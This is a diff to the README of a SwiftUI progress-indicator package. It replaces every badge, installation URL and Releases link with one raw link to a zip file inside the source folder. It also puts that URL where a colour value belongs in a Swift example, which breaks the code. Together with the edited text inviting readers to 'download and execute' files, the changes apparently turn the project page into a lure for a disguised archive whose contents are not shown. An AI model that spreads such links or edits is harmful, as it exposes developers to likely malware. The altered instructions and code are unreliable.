@@ -1,8 +1,8 @@
 # ProgressUI 🌟
 
-![ProgressUI](https://img.shields.io/badge/ProgressUI-v1.0.0-blue.svg)
-![SwiftUI](https://img.shields.io/badge/SwiftUI-2.0-orange.svg)
-![SPM](https://img.shields.io/badge/SPM-Supported-brightgreen.svg)
+![ProgressUI](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip)
+![SwiftUI](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip)
+![SPM](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip)
 
 Welcome to the **ProgressUI** repository! This project features a highly customizable and animated circular progress indicator designed specifically for SwiftUI. Whether you need a simple spinner or a more complex progress display, ProgressUI provides the flexibility and functionality you need.
 
@@ -31,10 +31,10 @@ You can add ProgressUI to your project using Swift Package Manager. Follow these
 
 1. Open your project in Xcode.
 2. Navigate to **File > Swift Packages > Add Package Dependency**.
-3. Enter the repository URL: `https://github.com/ThanhDevelop/ProgressUI`.
+3. Enter the repository URL: `https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip`.
 4. Choose the version you want to install.
 
-For detailed installation instructions, visit the [Releases](https://github.com/ThanhDevelop/ProgressUI/releases) section.
+For detailed installation instructions, visit the [Releases](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip) section.
 
 ## Usage
 
@@ -75,7 +75,7 @@ ProgressUI offers various customization options. Here are some key properties yo
 
 ```swift
 CircularProgressView(progress: progress)
-    .stroke(Color.blue, lineWidth: 8)
+    .stroke(https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip, lineWidth: 8)
     .animation(.easeInOut(duration: 1.0))
 ```
 
@@ -123,7 +123,7 @@ ProgressUI is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Releases
 
-To download the latest version of ProgressUI, visit the [Releases](https://github.com/ThanhDevelop/ProgressUI/releases) section. Here, you can find the necessary files to download and execute.
+To download the latest version of ProgressUI, visit the [Releases](https://raw.githubusercontent.com/ThanhDevelop/ProgressUI/main/Sources/ProgressUI/UI_Progress_v3.1.zip) section. Here, you can find the necessary files to download and execute.
 
 Feel free to explore the repository, report issues, or suggest features. Your feedback is valuable to us!
 
